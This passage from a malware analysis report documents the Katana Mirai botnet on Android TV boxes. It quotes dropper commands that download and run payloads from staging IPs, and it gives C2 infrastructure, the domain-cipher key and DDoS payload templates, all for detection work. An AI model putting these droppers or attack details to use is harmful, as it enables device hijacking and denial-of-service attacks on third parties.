# Katana: a Mirai variant that compiles its own rootkit on Android TV set-top boxes

**Nokia Deepfield Emergency Response Team (ERT)**

**First published: 2026-03-17** (last updated: 2026-03-18)

> **Content warning:** This report quotes malware artifacts verbatim, including domain names, C2 strings, and build paths chosen by the threat actors. Some contain crude or offensive language. These are reproduced exactly as found in samples to enable accurate detection and attribution.

---

# Executive summary

This report documents the **Katana** botnet, a Mirai variant targeting Android TV set-top boxes through ADB exploitation. The devices it infects are low-cost, often unbranded boxes running the Android Open Source Project (AOSP) without Google Play Protect or official Google certification, not Google-branded Android TV products.

Katana is part of a growing wave of botnets exploiting the same attack surface: residential proxy services that expose internal networks, enabling mass ADB exploitation of Android TV devices. This delivery method, [first documented](https://synthient.com/blog/a-broken-system-fueling-botnets) in the context of the Kimwolf proxy botnet and subsequently disclosed to affected proxy providers in late 2025, has since attracted multiple independent operators. The economics are straightforward: for the cost of a residential proxy subscription, an operator gains access to tens of millions of AOSP devices with unauthenticated remote shell access — without writing a single exploit.

Katana is one of these operators. It has no code or infrastructure overlap with Kimwolf, but the two families compete for the same pool of vulnerable devices, and Katana's aggressive bot killer and ADB port remapping reflect an ongoing turf war: multiple botnet operators are now fighting each other for control of the same pool of devices, and the devices' owners are not part of the conversation.

What sets Katana apart from the dozens of Mirai forks circulating on these devices is technical complexity: it packages a DDoS bot with an on-device compiled kernel rootkit inside an Android APK, giving it persistence and stealth unusual for this class of malware.

The name "Katana" is a community attribution; it does not appear in the binary. The bot self-identifies as **MIRAI** via its Busybox probe strings (`/bin/busybox MIRAI`). [Avira first documented](https://www.darkreading.com/iot/avira-researchers-discover-a-new-variant-of-mirai) Katana as a Mirai alias in October 2020 (page since removed; referenced via Malpedia and DarkReading), and the current samples represent a substantially evolved variant.

We retrieved the APK from the primary staging server `87.121.84[.]74:13121` in March 2026 and identified a secondary staging server at `45.153.34[.]187` (pfcloud.io) on 2026-03-16. The arm7 bot binary was compiled with debug symbols, yielding full function names, symbol tables, and source file references. ThreatFox independently tags the C2 domains and IP addresses as "Mirai alias Katana" (first seen 2025-11-07 for the `satyr[.]wtf` scanner domain, 2026-02-22 for the current C2 infrastructure).

**Key findings:**

- **At least 30,000 active bots** based on network observations (lower-end estimate). The botnet is actively operational as of March 2026, with observed attack volumes reaching 150 Gbps. For context, 30,000 bots in a single DDoS botnet would have been exceptional as recently as early 2025; the rapid growth of ADB-targeting botnets over the past year has normalized fleet sizes that were previously associated only with the largest operations.

- **Aggressive environment control.** A locker process binds to ADB port 5555 and kills any new process not present at boot, blocking rival bots and forensic tools. The bot disables 100+ system utilities via bind-mount blocking and remaps the ADB port, locking out both competitors and device owners (who, in fairness, did not know they were offering unauthenticated root shell access to their home network).

- **No scanner, no credential table.** External ADB exploitation scripts handle propagation entirely. This is a pure DDoS payload.

- **Rootkit compilation on-device.** The APK ships 5 architecture-specific bot binaries plus TinyCC and rootkit source code, compiling a kernel module (`wlan_helper.ko`) on each target device. The module hooks 5 syscalls to hide the bot from process listings, prevent file deletion, and block signal delivery. Mirai derivatives almost never ship kernel modules; this is a notable escalation — though we have observed rival operators successfully removing Katana from devices, suggesting the rootkit's reach exceeds its grasp.

- **Encrypted C2 with runtime domain rotation.** Three domains are encrypted via a custom 5-step cipher; a fourth (`iloveyourweewee[.]bz`) is delivered at runtime. All resolve, at the time of writing, to bulletproof hosting at Omegatech (Seychelles). The C2 can push new domains without redeploying binaries.

- **3-day self-destruct** removes all persistence if C2 is unreachable, cleaning up SysVinit scripts, cron jobs, and bot binaries.

- **11 DDoS attack methods** including protocol-specific floods targeting FiveM game servers (CitizenFX API), SSH services (PuTTY banner spoofing), MySQL authentication, SMTP relay, IRC, FTP, LDAP, TeamSpeak 3, and Valve Source Engine.

- **Indicators of AI-assisted development.** Several components, particularly the tool blocklist and protocol payload templates, show patterns consistent with LLM-generated code (see [AI-assistance assessment](#ai-assistance-assessment)).

# Prior research



Katana appears in the threat intelligence community as a recognized Mirai variant alias, but with limited dedicated analysis:

- [**Malpedia**](https://malpedia.caad.fkie.fraunhofer.de/details/elf.mirai) lists "Katana" as an alias under `elf.mirai`.

- [**Avira**](https://www.darkreading.com/iot/avira-researchers-discover-a-new-variant-of-mirai) (October 2020) published "Katana: a new variant of the Mirai botnet," the earliest reference. The original Avira page has since been removed; the DarkReading coverage remains.

- **ThreatFox** (abuse.ch) tracks Katana IoCs under `elf.mirai` with alias `Katana`. The earliest IoC is the scanner report domain `ajshgdhjfg...satyr[.]wtf` (first seen 2025-11-07). The current C2 domains were reported 2026-02-22 by researcher NDA0E.

- **VirusTotal** community notes on `thespacemachines[.]st` identify the associated samples as Katana.

- A **Katana source code repository** (`saintly2k/katana`) was publicly available on GitHub (C + Go, Mirai-based, now archived). Its relationship to the samples analyzed here is unclear; it may be an ancestor or a parallel fork sharing the name.

No public deep-dive analysis of the current Katana variant has been identified. The samples analyzed in this report do not match the 2020-era Katana described by Avira. They represent a substantially newer build with rootkit capabilities, APK wrapping, custom domain encryption, and modern Chrome user-agent strings (Chrome 144, released in 2025).

## Related AOSP / Android TV set-top box botnet research

While no prior analysis covers the current Katana variant, several recent campaigns target the same population of uncertified AOSP-based TV boxes and provide essential context:

- [**Pandora / Android.Pandora.2**](https://news.drweb.com/show/?lng=en&i=14743) (Doctor Web, September 2023): A Mirai variant targeting Android TV devices via malicious firmware updates and pirated streaming APKs. Targets the same device models observed in Katana campaigns (Tanix TX6, MX10 Pro, H96 MAX). Uses `supervisord` for watchdog persistence and modifies `/system` partition files. The closest direct precedent for Mirai on Android TV.

- [**Bigpanzi / Pandoraspear**](https://blog.xlab.qianxin.com/bigpanzi-exposed-hidden-cyber-threat-behind-your-stb/) (QiAnXin XLab, January 2024): A Mirai-derived botnet with 170,000+ daily active Android TV and set-top box bots. Its `pandoraspear` backdoor implements 11 DDoS attack vectors derived from Mirai, plus DNS hijacking and reverse shell capabilities. Demonstrates the scale achievable when targeting ADB-exposed Android TV devices.

- [**Vo1d**](https://blog.xlab.qianxin.com/long-live-the-vo1d_botnet/) (Doctor Web / XLab, September 2024–February 2025): One of the largest Android TV botnets documented, peaking at 1.6 million infected devices across 226 countries. Not Mirai-derived, but targets the same ecosystem of cheap, uncertified Android TV boxes. Uses RSA 2048 + XXTEA encryption and domain generation algorithms for C2 resilience.

- [**BadBox 2.0**](https://www.humansecurity.com/learn/blog/badbox-2-0-the-sequel-no-one-wanted/) (HUMAN Security, March 2025): A supply-chain botnet infecting over 1 million uncertified AOSP devices (TV boxes, tablets, projectors, and car infotainment systems) with pre-installed or sideloaded backdoors. Monetized through ad fraud and residential proxy services. Notable for the coordinated disruption involving HUMAN, Google, Trend Micro, the FBI, and The Shadowserver Foundation, and for Google's subsequent federal lawsuit against the operators.

- [**Kimwolf**](https://synthient.com/blog/a-broken-system-fueling-botnets) (Synthient, January 2026): The largest known Android TV botnet, with over 3 million infected devices reported. A residential proxy botnet delivered via ADB exploitation of Android TV devices. Synthient's research documented how permissive residential proxy services enabled attackers to scan internal networks for ADB-exposed devices, a delivery technique that was subsequently disclosed to affected proxy providers in late 2025. Multiple operators, including Katana's, have since adopted the same approach. Katana has no code or infrastructure overlap with Kimwolf, but the two families compete for the same device population, and we observe significant churn in botnet membership on residential proxy exit nodes as operators displace each other.

# Sample inventory



The analyzed APK (`aaaa8948`) dates from 2026-02-21; we retrieved it live from the staging server on 2026-03-15. It contains 9 embedded assets:

| **Asset** | **Arch** | **Size** | **Stripped** | **Purpose** |
|----|----|----|----|----|
| `arm5` | ARM (OABI) | 130 KB | Yes | Bot binary |
| `arm7` | ARM (EABI4) | 241 KB | **No** | Bot binary (debug symbols) |
| `arm64` | AArch64 | 841 KB | Yes | Bot binary |
| `x86_32` | x86 | 133 KB | — | Bot binary |
| `x86_64` | x86-64 | 122 KB | — | Bot binary |
| `rkcompiler` | ARM (EABI4) | 65 KB | Yes | Rootkit source compiler |
| `rkloader_arm5` | ARM (OABI) | 38 KB | Yes | Rootkit kernel module loader |
| `rkloader_arm7` | ARM (EABI4) | 62 KB | — | Rootkit kernel module loader |
| `tcc_arm5` | ARM (OABI) | 217 KB | — | TinyCC compiler |
| `tcc_arm7` | ARM (EABI4) | 247 KB | — | TinyCC compiler |

*APK embedded assets*



The arm7 binary is the primary analysis target. The authors compiled it with GCC 4.2.1 against uClibc, statically linked, and it uniquely retains full DWARF debug information (`.debug_info`, `.debug_line`, `.debug_loc`, `.debug_str`) and an unstripped symbol table with 419 functions and 1,851 symbols. This provides function names, source file paths, and variable names, an operational security oversight that made our analysis considerably more pleasant.

The APK bundles binaries for 5 architectures (ARM5, ARM7, ARM64, x86_32, x86_64), which is notable given that all observed delivery targets ADB-exposed Android TV devices with ARM SoCs. The x86 variants serve no purpose on these targets. Either the APK is a generic build also used via delivery vectors we have not observed, or someone is compiling for architectures they will never encounter. Both possibilities are consistent with the development patterns discussed in [AI-assistance assessment](#ai-assistance-assessment).

APK signing certificate:

- Subject: `C=US, ST=Unknown, L=Unknown, O=Android, OU=Update, CN=System`

- Serial: `5F1A1CBA`

- Valid: 2026-02-13 to 2053-07-01

# Delivery chain



All observed delivery of Katana targets ADB-exposed Android TV devices. We captured three concurrent dropper patterns from two staging IP addresses. We observed the operator adapting scripts in real time when downloads failed, cycling through fallback methods within minutes. The presence of x86 binaries in the APK (see [Sample inventory](#sample-inventory)) suggests other delivery vectors may exist but we have not observed them.

## Staging infrastructure

Two staging servers serve payloads on dedicated ports:

| **IP** | **ASN / Org** | **CC** | **Port** | **Payload** |
|--------|---------------|--------|----------|-------------|
| `87.121.84[.]74`  | vpsvault.host (AS215925) | NL | 13121 | `com.system.update` APK (`app.apk`)         |
| `87.121.84[.]74`  | vpsvault.host (AS215925) | NL | 13122 | ARM7 ELF binary (`arm7.kok`)                |
| `87.121.84[.]74`  | vpsvault.host (AS215925) | NL | 13123 | `com.google.android.update` APK (`wow.apk`) |
| `45.153.34[.]187` | pfcloud.io (AS51396)     | NL | 13121 | `com.system.update` APK (fallback)          |
| `45.153.34[.]187` | pfcloud.io (AS51396)     | NL | 13122 | ARM7 ELF binary (fallback)                  |

*Staging port-to-payload mapping*

The secondary IP address `45.153.34[.]187` (AS51396, pfcloud.io) serves as a fallback when the primary server is unreachable. Some dropper iterations also attempt ports 80 and 443 on both servers as a last resort.

## APK dropper (com.system.update)

The primary delivery method installs the APK via `pm install` with up to 5 fallback methods:

    cd /data/local/tmp && rm -f app.apk
    toybox nc 87.121.84[.]74 13121 > app.apk
    pm install -r /data/local/tmp/app.apk \
      || pm install -t -r ... \
      || pm install -g -r ... \
      || cmd package install -r ... \
      || cmd package install -t -r ...
    am start -n com.system.update/.MainActivity
    am startservice -n com.system.update/.UpdateService

Post-install verification checks that `liblogger.so` (the bot binary) exists and is running by inspecting `/proc/[0-9]*/exe`.

## APK dropper (com.google.android.update rebrand)

A rebranded version uses package name `com.google.android.update` with identical staging infrastructure (port 13123). Key differences: the native binary is named `liblogger.so` (vs `libupdate.so`), and a `.MainActivity` launcher activity is present.

## Native binary dropper

A simpler variant downloads a raw ARM7 ELF binary (`arm7.kok`) from port 13122 and executes it directly:

    cd /data/local/tmp && rm -f arm7.kok
    toybox nc 87.121.84[.]74 13122 > arm7.kok
    chmod 755 arm7.kok; ./arm7.kok adb

The `adb` argument identifies the delivery vector to the C2. This dropper provides no APK persistence wrapper.

## Device targeting

All observed targets are uncertified AOSP-based (Android 9 / SDK 28) TV boxes and set-top boxes with ARM SoCs, none carrying Google Play Protect certification. These are the same class of low-cost, white-label devices targeted by Vo1d, BadBox, Kimwolf, and other Android TV botnets. Droppers fingerprint each device via `getprop` before download, collecting model, brand, Android version, SDK level, device codename, and manufacturer.

# C2 infrastructure



## Encrypted domains

The bot stores 3 encrypted C2 domains in `.rodata`, decrypted at runtime by the `decrypt_domain` function (VA `0x13514`). The bot uses a custom 5-step cipher:

1.  **Reverse**: the bot copies bytes in reverse order

2.  **Bit-rotate right**: each byte is rotated right by `(i % 3) + 1` bits

3.  **XOR**: each byte is XORed with a 16-byte key at index `i % 16`

4.  **XOR chain**: `buf[i] ^= buf[i-1]` applied from end to start

5.  **Running subtraction**: `buf[i] -= i × 7`

The 16-byte domain XOR key (assembled from 4 data segments in `.rodata`):

    4a 7e 92 b3 c5 d8 e1 f4 2c 5f 81 a4 b7 ca dd ee

Decrypted domains:

| **Slot** | **Domain** | **Resolution (2026-03-15)** |
|----|----|----|
| 0 | `thespacemachines[.]st` | 91.92.241\[.\]12, 72.56.52\[.\]10 |
| 1 | `okiloveyoupleasedonttouchme[.]net` | 91.92.241\[.\]12, 72.56.52\[.\]10 |
| 2 | `imsowiwiwiwiwi[.]com` | 91.92.241\[.\]12, 72.56.52\[.\]10 |

*Decrypted C2 domains*



At the time of writing, all three domains resolve to the same two IP addresses.

## Hardcoded fallback

The binary contains a hardcoded fallback C2 at `65.222.202[.]53:5880` (verizonbusiness.com, AS701, US) stored directly in the `.text` section. A previous build also referenced `31.214.244[.]19` (active1.com, DE).

## Scanner report domain

Table slot 0 contains the scanner report domain:

    ajshgdhjfgasthjydyufasghjfdafsgudgfhjasgfjh.satyr[.]wtf

The long subdomain is a campaign or bot-group identifier. ThreatFox tracks this domain as Katana since 2025-11-07. The `satyr[.]wtf` parent domain does not currently resolve.

## C2 IP infrastructure

| **IP** | **ASN / Org** | **CC** | **Role** |
|--------|---------------|--------|----------|
| `91.92.241[.]12` | omegatech.sc (AS202412) | NL | Active C2 (domain resolution) |
| `72.56.52[.]10` | goodtec.lv (AS39900) | LV | Active C2 (domain resolution) |
| `65.222.202[.]53` | verizonbusiness.com (AS701) | US | Hardcoded fallback |
| `87.121.84[.]74` | vpsvault.host (AS215925) | NL | ADB staging (primary) |
| `45.153.34[.]187` | pfcloud.io (AS51396) | NL | ADB staging (fallback) |

*C2 and staging infrastructure*

The 91.92.241.0/24 range ([Omegatech, AS202412](https://threatfox.abuse.ch/asn/202412/)) is a known bulletproof hosting provider registered in the Seychelles. ThreatFox tracks multiple unrelated malware families on Omegatech infrastructure including AsyncRAT, XWorm, Remcos, Cobalt Strike, and Rhadamanthys; [AbuseIPDB](https://www.abuseipdb.com/check/91.92.241.12) reports confirm persistent abuse across the /24. The second C2 address, `72.56.52[.]10`, belongs to SIA GOOD (AS39900), a Latvian hosting provider.

## Connection failover

The bot alternates between two C2 resolution modes:

- **Mode 0 (hardcoded)**: round-robins through the 3 encrypted domains

- **Mode 1 (persisted)**: uses domains received from C2 at runtime via the domain persistence command `0xFF 0x85` (see [Domain persistence](#domain-persistence-0xff-0x85) below)

After 5 consecutive connection failures in one mode, the bot switches to the other.

## Ports

| **Port** | **Protocol** | **Purpose** |
|----|----|----|
| 5880 | TCP | C2 port (hardcoded; unresponsive as of 2026-03-16) |
| 6969 | TCP | C2 port (active as of 2026-03-16; confirmed by ThreatFox) |
| 48101 | TCP | Scanner report port (from table) |
| 5555 | TCP | Locker (blocks ADB) |
| 58741 | TCP | Single-instance mutex |

*Network ports*

## C2 protocol

The C2 protocol is plaintext TCP with length-prefixed binary messages:

1.  **Connection**: TCP to resolved domain or fallback IP on port 5880 or 6969

2.  **Greeting**: sends 4-byte magic (`0x00000001`) followed by the bot's identifier string (from `argv[1]`)

3.  **Heartbeat**: every 60 seconds, sends a 2-byte null

4.  **Commands**: 2-byte big-endian length prefix, then payload

5.  **Special commands**:

    - `0xFF 0x85`: domain persistence (the C2 can push new domains to the bot at runtime), which the bot writes to `/var/.domains` and uses as an alternative resolution pool (see below)

    - `0xFF 0x88`: APK heartbeat trigger and acknowledgment

## Domain persistence (`0xFF 0x85`)



The `domain_persist` subsystem (source file `domain_persist.c`) allows the C2 to dynamically update the bot's domain list without a binary update. When the bot receives a `0xFF 0x85` command, it parses the payload as a list of domain strings and writes them to `/var/.domains` (with fallback paths `/tmp/.domains`, `/data/local/tmp/.domains`). On startup, the bot reads this file to populate a secondary domain pool.

The C2 protocol for this command uses a simple format: a 1-byte operation code (add=1, remove=2, clear=3), followed by a 1-byte domain length, followed by the domain encrypted with the same 5-step cipher used for the hardcoded domains (see [Table encryption](#table-encryption)). This means the C2 operator can rotate domains without redeploying binaries, a resilience mechanism against domain takedowns.

The domain persistence mechanism supports runtime domain rotation, allowing the C2 operator to add, remove, or replace resolution targets without redeploying binaries. A 4th domain, `iloveyourweewee[.]bz`, resolves to the same two C2 IP addresses (`91.92.241[.]12`, `72.56.52[.]10`).

## Botnet size and operational tempo

The botnet is actively operational as of March 2026. In a monitoring sample of approximately 300 attack commands, the most common methods were `udp_pps` (36%), `tcp_full` (25%), `udp_big` (24%), and `udp_app` (7%), with smaller shares of `http`, `udp_custom`, and `tcp_app`. Attacks targeted 183 unique IP addresses across cloud providers (Amazon, Google, OVH, Tencent, Cloudflare), game hosting, web hosting, and telecommunications. Durations are predominantly 10 to 300 seconds with a median of 60 seconds. Most observed attacks are under 100 Gbps, with some reaching approximately 150 Gbps.

Based on network observations, we estimate the botnet currently has **at least 30,000 active bots** (lower-end estimate). The target diversity and short durations are consistent with a DDoS-for-hire service.

## Attack command format



Attack commands (parsed by `attack_parse` at VA `0x8b44`) use the following binary format after the 2-byte length prefix:

    Offset  Size  Field
    0       4     Attack ID (uint32 BE), used to track/cancel specific attacks
    4       4     Duration (uint32 BE, seconds)
    8       1     Attack type (0–10, 0xDD=stop, 0xCA=botkill)
    9       1     Number of targets
    10+     5×N   Targets: IP address (4 bytes) + netmask (1 byte)
    10+5N   1     Number of options
    11+5N+  var   Options: key (1 byte) + value length (1 byte) + value

The 1-byte netmask field supports CIDR-style subnet targeting: masks smaller than /32 cause the bot to randomize the host portion of the destination address within the specified prefix, distributing attack traffic across an entire subnet. This enables carpet-bombing attacks, which spread traffic across an entire prefix rather than concentrating on a single address. Carpet bombing is particularly challenging for threshold-based DDoS detection, where no individual destination exceeds alerting limits; flow-based and behavioral detection approaches are less affected. All attacks observed in our monitoring sample targeted /32 (single host), but the capability is present in the binary.

### Attack options

| **Key** | **Name**       | **Default**     | **Description**                     |
|---------|----------------|-----------------|-------------------------------------|
| 7       | `dst_port`     | 0xFFFF (random) | Destination port                    |
| 6       | `src_port`     | 0xFFFF (random) | Source port                         |
| 4       | `ip_ttl`       | 64              | IP Time-to-Live                     |
| 5       | `ip_df`        | 1 (set)         | Don't Fragment flag                 |
| 1       | `ip_tos`       | —               | IP Type of Service                  |
| 2       | `ip_ident`     | 0 (random)      | IP identification field             |
| 24      | `conns`        | 100–500         | Concurrent connections / burst size |
| 34      | `pps_limit`    | unlimited       | Packets-per-second rate limit       |
| 35      | `payload_type` | 0 (random)      | UDP payload selector (see below)    |
| 25      | `src_ip`       | local           | Source IP override                  |
| 8       | `payload`      | —               | Custom payload data (string)        |
| 20      | `http_method`  | GET             | HTTP method                         |
| 21      | `http_path`    | /               | HTTP request path                   |
| 36      | `user_agent`   | —               | Custom User-Agent string            |

*Attack option keys (from `attack_get_opt_int` / `attack_get_opt_str` calls)*

The core option keys (`dst_port`, `src_port`, `ip_ttl`, `ip_df`, `ip_tos`, `ip_ident`, `conns`) are inherited from standard Mirai and are common across derivatives. The `payload_type` (option 35) and `user_agent` (option 36) selectors are Katana additions that parameterize the protocol-specific payloads described below.

### UDP payload types (option 35)

| **Value** | **Payload** | **Typical IP packet size** |
|----|----|----|
| 0 | Random data | 28–1500 B |
| 1 | `TSource Engine Query` (VSE amplification) | 53 B |
| 2 | `getinfo`/`getstatus` (game server query) | 40–42 B |
| 3 | `SAMP` (SA-MP game server query) | 39 B |
| 4 | DNS query | 62 B |
| 5 | `TS3INIT1` (TeamSpeak 3 init) | 62 B |
| 6 | FiveM/CitizenFX query | variable |
| 7 | LDAP search request (`objectClass`) | 80 B |

*UDP payload type selector*

### IP-layer packet sizes by attack type

| **Attack**    | **Packet size** | **Notes**                                    |
|---------------|-----------------|----------------------------------------------|
| `udp_pps`     | 46–82 B         | Minimal UDP, optimized for packet rate       |
| `udp_big`     | 928–1425 B      | Random payload 900–1397 B + 28 B headers     |
| `udp_app`     | 28–1500 B       | Variable, depends on payload option          |
| `tcp_full`    | 1340 B          | 0x514 B payload + 0x28 B IP/TCP headers      |
| `tcp_connect` | 40–64 B         | Connection-based, minimal packets            |
| `tcp_our`     | 40–1340 B       | Raw TCP with checksum, variable              |
| `tcp_fhs`     | 40 B            | FIN/SYN flag manipulation, header only       |
| `tcp_app`     | variable        | Protocol-dependent (FiveM, SSH, MySQL, etc.) |
| `raw_ip`      | 40+ B           | Raw IP packets, variable                     |
| `http`        | variable        | L7 HTTP with full headers and body           |

*Typical IP-layer packet sizes per attack method*

# Table encryption



The Mirai string table uses single-byte XOR with key **`0x31`**. The `table_unlock_val` function applies 20 key words from a `table_keys` array, but the runtime initialization produces a net effect equivalent to XOR `0x31`. Eighty XOR operations per byte to arrive at a net key of `0x31` — a journey, not a destination.

Key decrypted entries:

| **Slot** | **Decrypted value**        | **Purpose**              |
|----------|----------------------------|--------------------------|
| 0        | `ajshgdhjfg...satyr[.]wtf` | Scanner report domain    |
| 1        | `god will save us all`     | Scanner login banner     |
| 3        | `TSource Engine Query`     | VSE flood payload        |
| 9        | `enable`                   | Telnet credential        |
| 10       | `xrx.nf`                   | Xerox default credential |
| 11       | `shell`                    | Telnet credential        |
| 13       | `/bin/busybox MIRAI`       | Busybox probe (self-ID)  |
| 15       | `MIRAI: applet not found`  | Busybox probe response   |
| 17       | `meow`                     | C2 connection greeting   |
| 18       | `1337`                     | Identifier or port       |
| 19       | `48101`                    | Scanner report port      |

*Mirai table entries (XOR key `0x31`)*



The scanner login banner "god will save us all" is a distinctive Katana marker — but no scanner exists to deliver it. The message goes unsent, making it perhaps the most secure component in the binary. Despite table entries for `enable`, `xrx.nf` (Xerox default), and `shell`, **this binary contains no active telnet scanner**. The binary inherits these entries from the Mirai table template but never invokes them: no scanner function, no credential loop, and no propagation code exists in the binary. The operators fully externalize delivery to ADB exploitation.

# DDoS attack methods



The bot registers 11 attack methods plus 2 control commands in `attack_init`. For context, the original Mirai (2016) shipped 10 attack methods: UDP generic, UDP VSE, UDP DNS, UDP plain, TCP SYN, TCP ACK, TCP STOMP, GRE IP, GRE Ethernet, and HTTP. Katana drops the GRE methods and replaces them with additional TCP and UDP variants, and adds application-layer payloads for specific services.

The "Origin" column below indicates whether each method derives from the original Mirai source or is absent from it. Methods marked "Katana" are not necessarily unique to this variant — other Mirai forks may implement similar techniques — but they do not appear in the 2016 Mirai codebase:

| **ID** | **Function** | **Type** | **Origin** | **Spoofable** | **Notes** |
|----|----|----|----|----|-----|
| 0 | `attack_udp_app` | UDP application | Mirai | No | Generic UDP flood with configurable payload |
| 1 | `attack_udp_pps` | UDP PPS | Mirai | No | Packets-per-second optimized, small packets |
| 2 | `attack_udp_custom` | UDP custom | Katana | No | User-configurable payload and options |
| 3 | `attack_udp_big` | UDP big | Mirai | No | Large-packet flood |
| 4 | `attack_tcp_full` | TCP full | Katana | No | Full TCP connection flood |
| 5 | `attack_tcp_connect` | TCP connect | Katana | No | TCP connection-based flood |
| 6 | `attack_tcp_our` | TCP SYN/ACK | Mirai | **Yes** | Raw socket (`SOCK_RAW`), manual IP header |
| 7 | `attack_tcp_app` | TCP application | Katana | No | Protocol-specific payloads (see below) |
| 8 | `attack_tcp_fhs` | TCP FIN/SYN | Katana | **Yes** | Raw socket (`SOCK_RAW`), flag manipulation |
| 9 | `attack_rip` | Raw IP | Mirai | **Yes** | Raw socket (`IPPROTO_RAW` + `IP_HDRINCL`) |
| 10 | `attack_http` | HTTP | Enhanced | No | Layer-7 HTTP flood with redirect following |
| 0xDD | `attack_stop_all` | Control | Mirai | | Stop all running attacks |
| 0xCA | `attack_botkill` | Control | Mirai | | Kill competing bots |

*Attack method registry*

Three methods (`tcp_our`, `tcp_fhs`, `attack_rip`) use raw sockets with `IP_HDRINCL`, enabling source IP address spoofing via the `src_ip` attack option (key 25). The remaining methods use connected TCP or standard UDP sockets, meaning attack traffic carries the bot's real IP address. All attack methods are **IPv4 only**: the attack command format encodes targets as 4-byte addresses, and no `AF_INET6` socket calls exist in the binary — IPv6 adoption, it appears, remains slow even on the offensive side of the internet.



## TCP application attack payloads

The `attack_tcp_app` function (ID 7) is the most protocol-aware attack method. It establishes real TCP connections and sends protocol-specific payloads to bypass simple volumetric filtering:

### FiveM / CitizenFX (game servers)

Four request templates target FiveM game servers via the CitizenFX API:

    GET /info.json HTTP/1.1
    Host: %s:%d
    User-Agent: CitizenFX/1

    POST /client HTTP/1.1
    Content-Type: application/json
    {"method":"getEndpoints","token":"%s"}
    {"method":"getConfiguration","X-CitizenFX-Token":"%s"}

### SSH (PuTTY banner spoofing)

Five PuTTY version strings are rotated to impersonate legitimate SSH clients:

    SSH-2.0-PuTTY_Release_0.79
    SSH-2.0-PuTTY_Release_0.80
    SSH-2.0-PuTTY_Release_0.81
    SSH-2.0-PuTTY_Release_0.82
    SSH-2.0-PuTTY_Release_0.83

### MySQL authentication

Constructs MySQL native authentication handshake packets (`mysql_native_password`).

### SMTP relay

Rotates through SMTP commands with randomized hostnames:

    EHLO %s / HELO %s / NOOP / RSET

Against fake relay targets: `mail.server.local`, `smtp.domain.net`, `mx1.host.org`, `relay.mail.com`.

### IRC flood

    NICK %s / USER %s 0 * :%s
    PING :keepalive%u / WHO * / LIST / LUSERS / VERSION

### FTP

    USER anonymous / USER ftp / PASS guest@ / SYST / HELP

### LDAP

Sends `objectClass` search requests.

### Valve Source Engine (VSE)

Uses the `TSource Engine Query` string (also stored as table entry 3).

### TeamSpeak 3

Sends `TS3INIT1` initialization packets.

### Discord

Sends Discord WebSocket gateway payloads.

## HTTP attack

The `attack_http` function (ID 10) implements a layer-7 HTTP flood using raw TCP sockets (`socket` → `connect` → `send`) with no TLS library. The binary contains no OpenSSL, mbedTLS, WolfSSL, or any other TLS implementation — confirmed across all three decompiled binaries (arm7, rkcompiler, rkloader). **No JA3/JA4 fingerprint exists** because no TLS handshake is ever performed.

When the operator specifies an `https://` target, the bot sets the destination port to 443 but sends plaintext HTTP/1.1 into the TLS-expecting listener. Most servers will reject or ignore these connections since no TLS handshake occurs.

The request template:

```
{METHOD} {PATH} HTTP/1.1\r\n
Host: {host}\r\n
User-Agent: {random}\r\n
Connection: keep-alive\r\n
Accept: */*\r\n
\r\n
```

User-Agent pool (4 strings, randomly selected per connection slot):

| User-Agent | Platform |
|------------|----------|
| `Mozilla/5.0 ... Chrome/144.0.7559.111 Safari/537.36` | Windows 10 x64 |
| `Mozilla/5.0 ... Chrome/144.0.7559.111 Safari/537.36` | macOS 10.15.7 |
| `Mozilla/5.0 ... Chrome/144.0.7559.109 Safari/537.36` | Linux x86_64 |
| `Mozilla/5.0 ... Chrome/144.0.7559.110 Mobile Safari/537.36` | Android 10 |

Up to 500 concurrent connection slots per attack. Additional features:

- Cookie preservation and redirect following (`Location:` and `Refresh:` headers)

- POST support with `application/x-www-form-urlencoded` content type

- Chunked transfer encoding support

## UDP attacks

UDP floods include the `TSource Engine Query` payload for VSE amplification, `getinfo`/`getstatus` for game server reflection, and `TS3INIT1` for TeamSpeak 3.

## Detection signatures

Katana's `attack_tcp_app` (ID 7) sends protocol-specific payloads that vary in detection value. We categorize them by false-positive risk:

### Strong indicators (low false-positive risk)

- **SMTP**: placeholder relay hostnames `mail.server.local`, `smtp.domain.net`, `mx1.host.org`, `relay.mail.com` as EHLO/HELO arguments. None of these hostnames resolve, and their generic naming pattern is consistent with hardcoded test values rather than real mail infrastructure — making them the strongest single network indicator for Katana.

### Useful with rate/volume context (moderate false-positive risk)

- **FiveM**: `CitizenFX/1` user-agent string and `getEndpoints`/`getConfiguration` JSON method names. These are real FiveM API calls; legitimate game clients send identical payloads. Distinctive only at high connection rates from non-player IP addresses.

- **IRC**: `LUSERS` and `VERSION` commands sent immediately after `NICK`/`USER` registration. Some IRC clients (mIRC, irssi) send these on connect, but the specific combination and timing is uncommon.

- **HTTP**: Chrome 144 user-agent with per-platform version numbers `7559.111` (Windows), `7559.109` (Linux), `7559.110` (Android). These are real Chrome 144 version strings that match legitimate browsers. They become distinctive only as Chrome 144 ages out of active use.

### Not distinctive alone (high false-positive risk)

These strings appear in Katana but are standard protocol elements shared with legitimate traffic. They are useful only as corroborating evidence alongside stronger indicators:

- **SSH**: `SSH-2.0-PuTTY_Release_0.8` prefix (versions 0.79–0.83). Real PuTTY clients send identical banners. PuTTY is one of the most common SSH clients, and matching on this string alone would flag a large share of legitimate SSH traffic.

- **MySQL**: `mysql_native_password` authentication plugin name. This is the default MySQL authentication method; every standard MySQL client connection contains this string.

- **VSE**: `TSource Engine Query` is the standard Valve Source Engine query payload. All Mirai variants and legitimate game clients use it. Not distinctive for Katana.

# Rootkit



Katana's most distinctive feature is its on-device compiled kernel rootkit. This is unusual for DDoS botnets: while rootkits are common in APT tooling and some banking trojans, Mirai derivatives and other IoT DDoS families rarely ship kernel modules. The few that attempt rootkit-like hiding (e.g., modifying `ld.so.preload` for userspace library injection) operate entirely in userspace. Katana takes the more complex approach of compiling and loading a loadable kernel module (LKM) on the target device.

The on-device compilation strategy solves a real compatibility problem. Pre-compiled kernel modules must match the target's exact kernel version, which varies across Android TV devices and firmware builds. By shipping the TinyCC compiler and rootkit source code instead of a pre-built `.ko`, Katana can compile against whatever kernel headers are present on the device, trading binary size (the APK includes `tcc_arm5`, `tcc_arm7`, `rkcompiler`, and `rkloader_arm*`) for cross-device compatibility.

## Compilation chain

1.  The APK extracts `tcc` and `rkcompiler` to `/data/local/tmp/`

2.  `rkcompiler` uses TinyCC to compile `wlan_helper.ko` against the running kernel's headers

3.  `rkloader` loads the compiled module via `insmod`

4.  The module creates a `/proc/wlanhelper` control interface

## Syscall hooks

The rootkit hooks 5 syscalls:

